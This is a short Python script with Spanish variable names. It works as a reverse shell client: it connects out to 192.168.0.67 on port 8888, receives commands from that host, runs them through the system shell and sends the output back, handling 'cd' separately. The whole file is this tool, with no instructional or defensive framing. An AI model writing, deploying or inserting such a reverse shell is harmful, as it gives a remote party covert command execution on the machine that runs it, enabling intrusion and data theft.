# _*_ coding utf8 _*_
import os
import socket, subprocess

def consola():
    dirActual = os.getcwd()
    cliente.send(bytes(dirActual, "utf8"))
    while True:
        respuesta = cliente.recv(1024).decode("utf8")
        if respuesta == "salir":
            break
        elif respuesta[:2] == "cd" and len(respuesta) > 2:
            os.chdir(respuesta[3:])
            resultado = os.getcwd()
            cliente.send(bytes(resultado, "utf8"))
        else:
            proceso = subprocess.Popen(respuesta, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
            res = proceso.stdout.read() + proceso.stderr.read()
            if len(res) == 0:
                cliente.send("1")
            else:
                cliente.send(res)

cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cliente.connect(("192.168.0.67", 8888))
consola()
cliente.close()
